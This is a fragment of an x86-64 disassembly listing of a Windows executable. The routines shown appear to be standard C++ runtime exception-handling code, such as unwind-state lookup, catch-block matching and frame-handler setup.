   14000ab2f:	e8 b8 94 ff ff       	call   0x140003fec
   14000ab34:	e8 d7 8a ff ff       	call   0x140003610
   14000ab39:	48 8b 98 20 01 00 00 	mov    0x120(%rax),%rbx
   14000ab40:	eb 09                	jmp    0x14000ab4b
   14000ab42:	48 3b fb             	cmp    %rbx,%rdi
   14000ab45:	74 19                	je     0x14000ab60
   14000ab47:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
   14000ab4b:	48 85 db             	test   %rbx,%rbx
   14000ab4e:	75 f2                	jne    0x14000ab42
   14000ab50:	e8 97 94 ff ff       	call   0x140003fec
   14000ab55:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000ab5a:	48 83 c4 20          	add    $0x20,%rsp
   14000ab5e:	5f                   	pop    %rdi
   14000ab5f:	c3                   	ret
   14000ab60:	e8 ab 8a ff ff       	call   0x140003610
   14000ab65:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   14000ab69:	48 89 88 20 01 00 00 	mov    %rcx,0x120(%rax)
   14000ab70:	eb e3                	jmp    0x14000ab55
   14000ab72:	cc                   	int3
   14000ab73:	cc                   	int3
   14000ab74:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000ab79:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000ab7e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000ab83:	57                   	push   %rdi
   14000ab84:	48 81 ec a0 05 00 00 	sub    $0x5a0,%rsp
   14000ab8b:	48 8b f2             	mov    %rdx,%rsi
   14000ab8e:	48 8b e9             	mov    %rcx,%rbp
   14000ab91:	49 8b f8             	mov    %r8,%rdi
   14000ab94:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000ab99:	48 8d 15 d0 54 00 00 	lea    0x54d0(%rip),%rdx        # 0x140010070
   14000aba0:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   14000aba6:	49 8b d9             	mov    %r9,%rbx
   14000aba9:	e8 c2 7f ff ff       	call   0x140002b70
   14000abae:	48 8b 84 24 d0 05 00 	mov    0x5d0(%rsp),%rax
   14000abb5:	00 
   14000abb6:	48 8b 94 24 e8 05 00 	mov    0x5e8(%rsp),%rdx
   14000abbd:	00 
   14000abbe:	48 8b 4d 00          	mov    0x0(%rbp),%rcx
   14000abc2:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   14000abc7:	48 63 84 24 d8 05 00 	movslq 0x5d8(%rsp),%rax
   14000abce:	00 
   14000abcf:	4c 8d 1d 42 06 00 00 	lea    0x642(%rip),%r11        # 0x14000b218
   14000abd6:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   14000abdb:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   14000abe0:	48 8b 84 24 e0 05 00 	mov    0x5e0(%rsp),%rax
   14000abe7:	00 
   14000abe8:	45 33 c9             	xor    %r9d,%r9d
   14000abeb:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   14000abf0:	0f b6 84 24 f0 05 00 	movzbl 0x5f0(%rsp),%eax
   14000abf7:	00 
   14000abf8:	4c 89 5c 24 50       	mov    %r11,0x50(%rsp)
   14000abfd:	48 89 84 24 88 00 00 	mov    %rax,0x88(%rsp)
   14000ac04:	00 
   14000ac05:	48 8b 42 40          	mov    0x40(%rdx),%rax
   14000ac09:	48 8b 12             	mov    (%rdx),%rdx
   14000ac0c:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000ac11:	48 8d 84 24 d0 00 00 	lea    0xd0(%rsp),%rax
   14000ac18:	00 
   14000ac19:	48 89 5c 24 58       	mov    %rbx,0x58(%rsp)
   14000ac1e:	48 89 7c 24 70       	mov    %rdi,0x70(%rsp)
   14000ac23:	48 89 b4 24 80 00 00 	mov    %rsi,0x80(%rsp)
   14000ac2a:	00 
   14000ac2b:	48 c7 84 24 90 00 00 	movq   $0x19930520,0x90(%rsp)
   14000ac32:	00 20 05 93 19 
   14000ac37:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000ac3c:	e8 ab f9 ff ff       	call   0x14000a5ec
   14000ac41:	4c 8d 9c 24 a0 05 00 	lea    0x5a0(%rsp),%r11
   14000ac48:	00 
   14000ac49:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   14000ac4d:	49 8b 6b 18          	mov    0x18(%r11),%rbp
   14000ac51:	49 8b 73 20          	mov    0x20(%r11),%rsi
   14000ac55:	49 8b e3             	mov    %r11,%rsp
   14000ac58:	5f                   	pop    %rdi
   14000ac59:	c3                   	ret
   14000ac5a:	cc                   	int3
   14000ac5b:	cc                   	int3
   14000ac5c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000ac61:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000ac66:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000ac6b:	57                   	push   %rdi
   14000ac6c:	48 83 ec 20          	sub    $0x20,%rsp
   14000ac70:	49 8b e8             	mov    %r8,%rbp
   14000ac73:	48 8b f2             	mov    %rdx,%rsi
   14000ac76:	48 8b d9             	mov    %rcx,%rbx
   14000ac79:	48 85 c9             	test   %rcx,%rcx
   14000ac7c:	75 05                	jne    0x14000ac83
   14000ac7e:	e8 69 93 ff ff       	call   0x140003fec
   14000ac83:	48 63 43 18          	movslq 0x18(%rbx),%rax
   14000ac87:	8b 7b 14             	mov    0x14(%rbx),%edi
   14000ac8a:	48 03 46 08          	add    0x8(%rsi),%rax
   14000ac8e:	75 05                	jne    0x14000ac95
   14000ac90:	e8 57 93 ff ff       	call   0x140003fec
   14000ac95:	33 c9                	xor    %ecx,%ecx
   14000ac97:	85 ff                	test   %edi,%edi
   14000ac99:	74 33                	je     0x14000acce
   14000ac9b:	4c 8b 4e 08          	mov    0x8(%rsi),%r9
   14000ac9f:	4c 63 43 18          	movslq 0x18(%rbx),%r8
   14000aca3:	4b 8d 14 01          	lea    (%r9,%r8,1),%rdx
   14000aca7:	48 63 02             	movslq (%rdx),%rax
   14000acaa:	49 03 c1             	add    %r9,%rax
   14000acad:	48 3b e8             	cmp    %rax,%rbp
   14000acb0:	7c 0a                	jl     0x14000acbc
   14000acb2:	ff c1                	inc    %ecx
   14000acb4:	48 83 c2 08          	add    $0x8,%rdx
   14000acb8:	3b cf                	cmp    %edi,%ecx
   14000acba:	72 eb                	jb     0x14000aca7
   14000acbc:	85 c9                	test   %ecx,%ecx
   14000acbe:	74 0e                	je     0x14000acce
   14000acc0:	8d 41 ff             	lea    -0x1(%rcx),%eax
   14000acc3:	49 8d 14 c0          	lea    (%r8,%rax,8),%rdx
   14000acc7:	42 8b 44 0a 04       	mov    0x4(%rdx,%r9,1),%eax
   14000accc:	eb 03                	jmp    0x14000acd1
   14000acce:	83 c8 ff             	or     $0xffffffff,%eax
   14000acd1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000acd6:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000acdb:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000ace0:	48 83 c4 20          	add    $0x20,%rsp
   14000ace4:	5f                   	pop    %rdi
   14000ace5:	c3                   	ret
   14000ace6:	cc                   	int3
   14000ace7:	cc                   	int3
   14000ace8:	4c 8b 02             	mov    (%rdx),%r8
   14000aceb:	e9 6c ff ff ff       	jmp    0x14000ac5c
   14000acf0:	48 83 ec 28          	sub    $0x28,%rsp
   14000acf4:	4d 63 48 1c          	movslq 0x1c(%r8),%r9
   14000acf8:	48 8b 01             	mov    (%rcx),%rax
   14000acfb:	4d 8b d0             	mov    %r8,%r10
   14000acfe:	41 8b 04 01          	mov    (%r9,%rax,1),%eax
   14000ad02:	83 f8 fe             	cmp    $0xfffffffe,%eax
   14000ad05:	75 0b                	jne    0x14000ad12
   14000ad07:	4c 8b 02             	mov    (%rdx),%r8
   14000ad0a:	49 8b ca             	mov    %r10,%rcx
   14000ad0d:	e8 4a ff ff ff       	call   0x14000ac5c
   14000ad12:	48 83 c4 28          	add    $0x28,%rsp
   14000ad16:	c3                   	ret
   14000ad17:	cc                   	int3
   14000ad18:	49 63 50 1c          	movslq 0x1c(%r8),%rdx
   14000ad1c:	48 8b 01             	mov    (%rcx),%rax
   14000ad1f:	44 89 0c 02          	mov    %r9d,(%rdx,%rax,1)
   14000ad23:	c3                   	ret
   14000ad24:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000ad29:	57                   	push   %rdi
   14000ad2a:	48 83 ec 20          	sub    $0x20,%rsp
   14000ad2e:	41 8b f9             	mov    %r9d,%edi
   14000ad31:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   14000ad36:	49 8b d8             	mov    %r8,%rbx
   14000ad39:	e8 b6 f8 ff ff       	call   0x14000a5f4
   14000ad3e:	48 8b 08             	mov    (%rax),%rcx
   14000ad41:	48 63 43 1c          	movslq 0x1c(%rbx),%rax
   14000ad45:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   14000ad4a:	3b 7c 08 04          	cmp    0x4(%rax,%rcx,1),%edi
   14000ad4e:	7e 04                	jle    0x14000ad54
   14000ad50:	89 7c 08 04          	mov    %edi,0x4(%rax,%rcx,1)
   14000ad54:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000ad59:	48 83 c4 20          	add    $0x20,%rsp
   14000ad5d:	5f                   	pop    %rdi
   14000ad5e:	c3                   	ret
   14000ad5f:	cc                   	int3
   14000ad60:	40 53                	rex push %rbx
   14000ad62:	48 83 ec 20          	sub    $0x20,%rsp
   14000ad66:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   14000ad6b:	49 8b d8             	mov    %r8,%rbx
   14000ad6e:	e8 81 f8 ff ff       	call   0x14000a5f4
   14000ad73:	48 8b 08             	mov    (%rax),%rcx
   14000ad76:	48 63 43 1c          	movslq 0x1c(%rbx),%rax
   14000ad7a:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   14000ad7f:	8b 44 08 04          	mov    0x4(%rax,%rcx,1),%eax
   14000ad83:	48 83 c4 20          	add    $0x20,%rsp
   14000ad87:	5b                   	pop    %rbx
   14000ad88:	c3                   	ret
   14000ad89:	cc                   	int3
   14000ad8a:	cc                   	int3
   14000ad8b:	cc                   	int3
   14000ad8c:	48 8d 05 85 53 00 00 	lea    0x5385(%rip),%rax        # 0x140010118
   14000ad93:	48 89 01             	mov    %rax,(%rcx)
   14000ad96:	e9 ed 6d ff ff       	jmp    0x140001b88
   14000ad9b:	cc                   	int3
   14000ad9c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000ada1:	57                   	push   %rdi
   14000ada2:	48 83 ec 20          	sub    $0x20,%rsp
   14000ada6:	48 8d 05 6b 53 00 00 	lea    0x536b(%rip),%rax        # 0x140010118
   14000adad:	8b da                	mov    %edx,%ebx
   14000adaf:	48 8b f9             	mov    %rcx,%rdi
   14000adb2:	48 89 01             	mov    %rax,(%rcx)
   14000adb5:	e8 ce 6d ff ff       	call   0x140001b88
   14000adba:	f6 c3 01             	test   $0x1,%bl
   14000adbd:	74 08                	je     0x14000adc7
   14000adbf:	48 8b cf             	mov    %rdi,%rcx
   14000adc2:	e8 29 6e ff ff       	call   0x140001bf0
   14000adc7:	48 8b c7             	mov    %rdi,%rax
   14000adca:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000adcf:	48 83 c4 20          	add    $0x20,%rsp
   14000add3:	5f                   	pop    %rdi
   14000add4:	c3                   	ret
   14000add5:	cc                   	int3
   14000add6:	cc                   	int3
   14000add7:	cc                   	int3
   14000add8:	48 8b c4             	mov    %rsp,%rax
   14000addb:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000addf:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000ade3:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000ade7:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000adeb:	41 54                	push   %r12
   14000aded:	48 83 ec 20          	sub    $0x20,%rsp
   14000adf1:	8b 71 04             	mov    0x4(%rcx),%esi
   14000adf4:	33 db                	xor    %ebx,%ebx
   14000adf6:	4d 8b e0             	mov    %r8,%r12
   14000adf9:	48 8b ea             	mov    %rdx,%rbp
   14000adfc:	48 8b f9             	mov    %rcx,%rdi
   14000adff:	3b f3                	cmp    %ebx,%esi
   14000ae01:	74 0e                	je     0x14000ae11
   14000ae03:	48 63 f6             	movslq %esi,%rsi
   14000ae06:	e8 d5 f8 ff ff       	call   0x14000a6e0
   14000ae0b:	4c 8d 1c 06          	lea    (%rsi,%rax,1),%r11
   14000ae0f:	eb 03                	jmp    0x14000ae14
   14000ae11:	4c 8b db             	mov    %rbx,%r11
   14000ae14:	4c 3b db             	cmp    %rbx,%r11
   14000ae17:	0f 84 be 00 00 00    	je     0x14000aedb
   14000ae1d:	3b f3                	cmp    %ebx,%esi
   14000ae1f:	74 0f                	je     0x14000ae30
   14000ae21:	48 63 77 04          	movslq 0x4(%rdi),%rsi
   14000ae25:	e8 b6 f8 ff ff       	call   0x14000a6e0
   14000ae2a:	4c 8d 1c 06          	lea    (%rsi,%rax,1),%r11
   14000ae2e:	eb 03                	jmp    0x14000ae33
   14000ae30:	4c 8b db             	mov    %rbx,%r11
   14000ae33:	41 38 5b 10          	cmp    %bl,0x10(%r11)
   14000ae37:	0f 84 9e 00 00 00    	je     0x14000aedb
   14000ae3d:	3b f3                	cmp    %ebx,%esi
   14000ae3f:	74 11                	je     0x14000ae52
   14000ae41:	e8 9a f8 ff ff       	call   0x14000a6e0
   14000ae46:	48 8b f0             	mov    %rax,%rsi
   14000ae49:	48 63 47 04          	movslq 0x4(%rdi),%rax
   14000ae4d:	48 03 f0             	add    %rax,%rsi
   14000ae50:	eb 03                	jmp    0x14000ae55
   14000ae52:	48 8b f3             	mov    %rbx,%rsi
   14000ae55:	e8 9e f8 ff ff       	call   0x14000a6f8
   14000ae5a:	4c 8b d8             	mov    %rax,%r11
   14000ae5d:	48 63 45 04          	movslq 0x4(%rbp),%rax
   14000ae61:	4c 03 d8             	add    %rax,%r11
   14000ae64:	49 3b f3             	cmp    %r11,%rsi
   14000ae67:	74 3b                	je     0x14000aea4
   14000ae69:	39 5f 04             	cmp    %ebx,0x4(%rdi)
   14000ae6c:	74 11                	je     0x14000ae7f
   14000ae6e:	e8 6d f8 ff ff       	call   0x14000a6e0
   14000ae73:	48 8b f0             	mov    %rax,%rsi
   14000ae76:	48 63 47 04          	movslq 0x4(%rdi),%rax
   14000ae7a:	48 03 f0             	add    %rax,%rsi
   14000ae7d:	eb 03                	jmp    0x14000ae82
   14000ae7f:	48 8b f3             	mov    %rbx,%rsi
   14000ae82:	e8 71 f8 ff ff       	call   0x14000a6f8
   14000ae87:	48 8d 4e 10          	lea    0x10(%rsi),%rcx
   14000ae8b:	4c 8b d8             	mov    %rax,%r11
   14000ae8e:	48 63 45 04          	movslq 0x4(%rbp),%rax
   14000ae92:	49 8d 54 03 10       	lea    0x10(%r11,%rax,1),%rdx
   14000ae97:	e8 14 83 ff ff       	call   0x1400031b0
   14000ae9c:	3b c3                	cmp    %ebx,%eax
   14000ae9e:	74 04                	je     0x14000aea4
   14000aea0:	33 c0                	xor    %eax,%eax
   14000aea2:	eb 3c                	jmp    0x14000aee0
   14000aea4:	b0 02                	mov    $0x2,%al
   14000aea6:	84 45 00             	test   %al,0x0(%rbp)
   14000aea9:	74 05                	je     0x14000aeb0
   14000aeab:	f6 07 08             	testb  $0x8,(%rdi)
   14000aeae:	74 27                	je     0x14000aed7
   14000aeb0:	41 f6 04 24 01       	testb  $0x1,(%r12)
   14000aeb5:	74 05                	je     0x14000aebc
   14000aeb7:	f6 07 01             	testb  $0x1,(%rdi)
   14000aeba:	74 1b                	je     0x14000aed7
   14000aebc:	41 f6 04 24 04       	testb  $0x4,(%r12)
   14000aec1:	74 05                	je     0x14000aec8
   14000aec3:	f6 07 04             	testb  $0x4,(%rdi)
   14000aec6:	74 0f                	je     0x14000aed7
   14000aec8:	41 84 04 24          	test   %al,(%r12)
   14000aecc:	74 04                	je     0x14000aed2
   14000aece:	84 07                	test   %al,(%rdi)
   14000aed0:	74 05                	je     0x14000aed7
   14000aed2:	bb 01 00 00 00       	mov    $0x1,%ebx
   14000aed7:	8b c3                	mov    %ebx,%eax
   14000aed9:	eb 05                	jmp    0x14000aee0
   14000aedb:	b8 01 00 00 00       	mov    $0x1,%eax
   14000aee0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000aee5:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000aeea:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000aeef:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   14000aef4:	48 83 c4 20          	add    $0x20,%rsp
   14000aef8:	41 5c                	pop    %r12
   14000aefa:	c3                   	ret
   14000aefb:	cc                   	int3
   14000aefc:	48 83 ec 28          	sub    $0x28,%rsp
   14000af00:	48 8b 01             	mov    (%rcx),%rax
   14000af03:	81 38 4d 4f 43 e0    	cmpl   $0xe0434f4d,(%rax)
   14000af09:	74 1a                	je     0x14000af25
   14000af0b:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%rax)
   14000af11:	75 2b                	jne    0x14000af3e
   14000af13:	e8 f8 86 ff ff       	call   0x140003610
   14000af18:	83 a0 00 01 00 00 00 	andl   $0x0,0x100(%rax)
   14000af1f:	e8 a4 90 ff ff       	call   0x140003fc8
   14000af24:	cc                   	int3
   14000af25:	e8 e6 86 ff ff       	call   0x140003610
   14000af2a:	83 b8 00 01 00 00 00 	cmpl   $0x0,0x100(%rax)
   14000af31:	7e 0b                	jle    0x14000af3e
   14000af33:	e8 d8 86 ff ff       	call   0x140003610
   14000af38:	ff 88 00 01 00 00    	decl   0x100(%rax)
   14000af3e:	33 c0                	xor    %eax,%eax
   14000af40:	48 83 c4 28          	add    $0x28,%rsp
   14000af44:	c3                   	ret
   14000af45:	cc                   	int3
   14000af46:	cc                   	int3
   14000af47:	cc                   	int3
   14000af48:	48 8b c4             	mov    %rsp,%rax
   14000af4b:	44 89 48 20          	mov    %r9d,0x20(%rax)
   14000af4f:	4c 89 40 18          	mov    %r8,0x18(%rax)
   14000af53:	48 89 50 10          	mov    %rdx,0x10(%rax)
   14000af57:	48 89 48 08          	mov    %rcx,0x8(%rax)
   14000af5b:	53                   	push   %rbx
   14000af5c:	56                   	push   %rsi
   14000af5d:	57                   	push   %rdi
   14000af5e:	41 54                	push   %r12
   14000af60:	41 55                	push   %r13
   14000af62:	41 56                	push   %r14
   14000af64:	41 57                	push   %r15
   14000af66:	48 83 ec 30          	sub    $0x30,%rsp
   14000af6a:	45 8b e9             	mov    %r9d,%r13d
   14000af6d:	49 8b f0             	mov    %r8,%rsi
   14000af70:	48 8b da             	mov    %rdx,%rbx
   14000af73:	4c 8b f1             	mov    %rcx,%r14
   14000af76:	e8 75 fd ff ff       	call   0x14000acf0
   14000af7b:	8b f8                	mov    %eax,%edi
   14000af7d:	e8 5e f7 ff ff       	call   0x14000a6e0
   14000af82:	4c 8b f8             	mov    %rax,%r15
   14000af85:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000af8a:	e8 81 86 ff ff       	call   0x140003610
   14000af8f:	ff 80 00 01 00 00    	incl   0x100(%rax)
   14000af95:	83 ff ff             	cmp    $0xffffffff,%edi
   14000af98:	0f 84 f5 00 00 00    	je     0x14000b093
   14000af9e:	41 3b fd             	cmp    %r13d,%edi
   14000afa1:	0f 8e ec 00 00 00    	jle    0x14000b093
   14000afa7:	83 ff ff             	cmp    $0xffffffff,%edi
   14000afaa:	7e 05                	jle    0x14000afb1
   14000afac:	3b 7e 04             	cmp    0x4(%rsi),%edi
   14000afaf:	7c 05                	jl     0x14000afb6
   14000afb1:	e8 36 90 ff ff       	call   0x140003fec
   14000afb6:	4c 63 e7             	movslq %edi,%r12
   14000afb9:	e8 22 f7 ff ff       	call   0x14000a6e0
   14000afbe:	48 63 4e 08          	movslq 0x8(%rsi),%rcx
   14000afc2:	4a 8d 04 e0          	lea    (%rax,%r12,8),%rax
   14000afc6:	8b 3c 01             	mov    (%rcx,%rax,1),%edi
   14000afc9:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   14000afcd:	e8 0e f7 ff ff       	call   0x14000a6e0
   14000afd2:	48 63 4e 08          	movslq 0x8(%rsi),%rcx
   14000afd6:	4a 8d 04 e0          	lea    (%rax,%r12,8),%rax
   14000afda:	83 7c 01 04 00       	cmpl   $0x0,0x4(%rcx,%rax,1)
   14000afdf:	74 21                	je     0x14000b002
   14000afe1:	e8 fa f6 ff ff       	call   0x14000a6e0
   14000afe6:	48 63 4e 08          	movslq 0x8(%rsi),%rcx
   14000afea:	4a 8d 04 e0          	lea    (%rax,%r12,8),%rax
   14000afee:	48 63 5c 01 04       	movslq 0x4(%rcx,%rax,1),%rbx
   14000aff3:	e8 e8 f6 ff ff       	call   0x14000a6e0
   14000aff8:	48 03 c3             	add    %rbx,%rax
   14000affb:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   14000b000:	eb 02                	jmp    0x14000b004
   14000b002:	33 c0                	xor    %eax,%eax
   14000b004:	48 85 c0             	test   %rax,%rax
   14000b007:	74 5c                	je     0x14000b065
   14000b009:	44 8b cf             	mov    %edi,%r9d
   14000b00c:	4c 8b c6             	mov    %rsi,%r8
   14000b00f:	48 8b d3             	mov    %rbx,%rdx
   14000b012:	49 8b ce             	mov    %r14,%rcx
   14000b015:	e8 fe fc ff ff       	call   0x14000ad18
   14000b01a:	e8 c1 f6 ff ff       	call   0x14000a6e0
   14000b01f:	48 63 4e 08          	movslq 0x8(%rsi),%rcx
   14000b023:	4a 8d 04 e0          	lea    (%rax,%r12,8),%rax
   14000b027:	83 7c 01 04 00       	cmpl   $0x0,0x4(%rcx,%rax,1)
   14000b02c:	74 1c                	je     0x14000b04a
   14000b02e:	e8 ad f6 ff ff       	call   0x14000a6e0
   14000b033:	48 63 4e 08          	movslq 0x8(%rsi),%rcx
   14000b037:	4a 8d 04 e0          	lea    (%rax,%r12,8),%rax
   14000b03b:	48 63 5c 01 04       	movslq 0x4(%rcx,%rax,1),%rbx
   14000b040:	e8 9b f6 ff ff       	call   0x14000a6e0
   14000b045:	48 03 c3             	add    %rbx,%rax
   14000b048:	eb 02                	jmp    0x14000b04c
   14000b04a:	33 c0                	xor    %eax,%eax
   14000b04c:	41 b8 03 01 00 00    	mov    $0x103,%r8d
   14000b052:	49 8b d6             	mov    %r14,%rdx
   14000b055:	48 8b c8             	mov    %rax,%rcx
   14000b058:	e8 a3 12 00 00       	call   0x14000c300
   14000b05d:	49 8b cf             	mov    %r15,%rcx
   14000b060:	e8 ab f6 ff ff       	call   0x14000a710
   14000b065:	eb 1e                	jmp    0x14000b085
   14000b067:	44 8b ac 24 88 00 00 	mov    0x88(%rsp),%r13d
   14000b06e:	00 
   14000b06f:	48 8b b4 24 80 00 00 	mov    0x80(%rsp),%rsi
   14000b076:	00 
   14000b077:	4c 8b 74 24 70       	mov    0x70(%rsp),%r14
   14000b07c:	4c 8b 7c 24 28       	mov    0x28(%rsp),%r15
   14000b081:	8b 7c 24 20          	mov    0x20(%rsp),%edi
   14000b085:	89 7c 24 24          	mov    %edi,0x24(%rsp)
   14000b089:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   14000b08e:	e9 02 ff ff ff       	jmp    0x14000af95
   14000b093:	e8 78 85 ff ff       	call   0x140003610
   14000b098:	83 b8 00 01 00 00 00 	cmpl   $0x0,0x100(%rax)
   14000b09f:	7e 0b                	jle    0x14000b0ac
   14000b0a1:	e8 6a 85 ff ff       	call   0x140003610
   14000b0a6:	ff 88 00 01 00 00    	decl   0x100(%rax)
   14000b0ac:	83 ff ff             	cmp    $0xffffffff,%edi
   14000b0af:	74 0a                	je     0x14000b0bb
   14000b0b1:	41 3b fd             	cmp    %r13d,%edi
   14000b0b4:	7e 05                	jle    0x14000b0bb
   14000b0b6:	e8 31 8f ff ff       	call   0x140003fec
   14000b0bb:	44 8b cf             	mov    %edi,%r9d
   14000b0be:	4c 8b c6             	mov    %rsi,%r8
   14000b0c1:	48 8b d3             	mov    %rbx,%rdx
   14000b0c4:	49 8b ce             	mov    %r14,%rcx
   14000b0c7:	e8 4c fc ff ff       	call   0x14000ad18
   14000b0cc:	48 83 c4 30          	add    $0x30,%rsp
   14000b0d0:	41 5f                	pop    %r15
   14000b0d2:	41 5e                	pop    %r14
   14000b0d4:	41 5d                	pop    %r13
   14000b0d6:	41 5c                	pop    %r12
   14000b0d8:	5f                   	pop    %rdi
   14000b0d9:	5e                   	pop    %rsi
   14000b0da:	5b                   	pop    %rbx
   14000b0db:	c3                   	ret
   14000b0dc:	88 54 24 10          	mov    %dl,0x10(%rsp)
   14000b0e0:	48 83 ec 28          	sub    $0x28,%rsp
   14000b0e4:	33 c0                	xor    %eax,%eax
   14000b0e6:	48 3b c8             	cmp    %rax,%rcx
   14000b0e9:	74 2f                	je     0x14000b11a
   14000b0eb:	81 39 63 73 6d e0    	cmpl   $0xe06d7363,(%rcx)
   14000b0f1:	75 27                	jne    0x14000b11a
   14000b0f3:	48 8b 51 30          	mov    0x30(%rcx),%rdx
   14000b0f7:	48 3b d0             	cmp    %rax,%rdx
   14000b0fa:	74 1e                	je     0x14000b11a
   14000b0fc:	39 42 04             	cmp    %eax,0x4(%rdx)
   14000b0ff:	74 19                	je     0x14000b11a
   14000b101:	48 63 42 04          	movslq 0x4(%rdx),%rax
   14000b105:	48 8b 51 38          	mov    0x38(%rcx),%rdx
   14000b109:	48 03 d0             	add    %rax,%rdx
   14000b10c:	48 8b 49 28          	mov    0x28(%rcx),%rcx
   14000b110:	ff d2                	call   *%rdx
   14000b112:	eb 06                	jmp    0x14000b11a
   14000b114:	e8 af 8e ff ff       	call   0x140003fc8
   14000b119:	90                   	nop
   14000b11a:	48 83 c4 28          	add    $0x28,%rsp
   14000b11e:	c3                   	ret
   14000b11f:	cc                   	int3
   14000b120:	48 63 02             	movslq (%rdx),%rax
   14000b123:	48 03 c1             	add    %rcx,%rax
   14000b126:	83 7a 04 00          	cmpl   $0x0,0x4(%rdx)
   14000b12a:	7c 16                	jl     0x14000b142
   14000b12c:	4c 63 4a 04          	movslq 0x4(%rdx),%r9
   14000b130:	48 63 52 08          	movslq 0x8(%rdx),%rdx
   14000b134:	49 8b 0c 09          	mov    (%r9,%rcx,1),%rcx
   14000b138:	4c 63 04 0a          	movslq (%rdx,%rcx,1),%r8
   14000b13c:	4d 03 c1             	add    %r9,%r8
   14000b13f:	49 03 c0             	add    %r8,%rax
   14000b142:	c3                   	ret
   14000b143:	cc                   	int3
   14000b144:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b149:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000b14e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000b153:	57                   	push   %rdi
   14000b154:	41 54                	push   %r12
   14000b156:	41 55                	push   %r13
   14000b158:	41 56                	push   %r14
   14000b15a:	41 57                	push   %r15
   14000b15c:	48 83 ec 20          	sub    $0x20,%rsp
   14000b160:	48 8b f2             	mov    %rdx,%rsi
   14000b163:	4c 8b f1             	mov    %rcx,%r14
   14000b166:	48 85 d2             	test   %rdx,%rdx
   14000b169:	75 0b                	jne    0x14000b176
   14000b16b:	e8 7c 8e ff ff       	call   0x140003fec
   14000b170:	e8 53 8e ff ff       	call   0x140003fc8
   14000b175:	cc                   	int3
   14000b176:	33 ff                	xor    %edi,%edi
   14000b178:	45 32 e4             	xor    %r12b,%r12b
   14000b17b:	39 3a                	cmp    %edi,(%rdx)
   14000b17d:	7e 78                	jle    0x14000b1f7
   14000b17f:	e8 74 f5 ff ff       	call   0x14000a6f8
   14000b184:	4c 8b d8             	mov    %rax,%r11
   14000b187:	49 8b 46 30          	mov    0x30(%r14),%rax
   14000b18b:	48 63 48 0c          	movslq 0xc(%rax),%rcx
   14000b18f:	4d 8d 6c 0b 04       	lea    0x4(%r11,%rcx,1),%r13
   14000b194:	e8 5f f5 ff ff       	call   0x14000a6f8
   14000b199:	4c 8b d8             	mov    %rax,%r11
   14000b19c:	49 8b 46 30          	mov    0x30(%r14),%rax
   14000b1a0:	48 63 48 0c          	movslq 0xc(%rax),%rcx
   14000b1a4:	41 8b 2c 0b          	mov    (%r11,%rcx,1),%ebp
   14000b1a8:	85 ed                	test   %ebp,%ebp
   14000b1aa:	7e 45                	jle    0x14000b1f1
   14000b1ac:	48 63 c7             	movslq %edi,%rax
   14000b1af:	4c 8d 3c 80          	lea    (%rax,%rax,4),%r15
   14000b1b3:	e8 40 f5 ff ff       	call   0x14000a6f8
   14000b1b8:	48 8b d8             	mov    %rax,%rbx
   14000b1bb:	49 63 45 00          	movslq 0x0(%r13),%rax
   14000b1bf:	48 03 d8             	add    %rax,%rbx
   14000b1c2:	e8 19 f5 ff ff       	call   0x14000a6e0
   14000b1c7:	48 63 4e 04          	movslq 0x4(%rsi),%rcx
   14000b1cb:	4d 8b 46 30          	mov    0x30(%r14),%r8
   14000b1cf:	4a 8d 04 b8          	lea    (%rax,%r15,4),%rax
   14000b1d3:	48 8b d3             	mov    %rbx,%rdx
   14000b1d6:	48 03 c8             	add    %rax,%rcx
   14000b1d9:	e8 fa fb ff ff       	call   0x14000add8
   14000b1de:	85 c0                	test   %eax,%eax
   14000b1e0:	75 0c                	jne    0x14000b1ee
   14000b1e2:	ff cd                	dec    %ebp
   14000b1e4:	49 83 c5 04          	add    $0x4,%r13
   14000b1e8:	85 ed                	test   %ebp,%ebp
   14000b1ea:	7f c7                	jg     0x14000b1b3
   14000b1ec:	eb 03                	jmp    0x14000b1f1
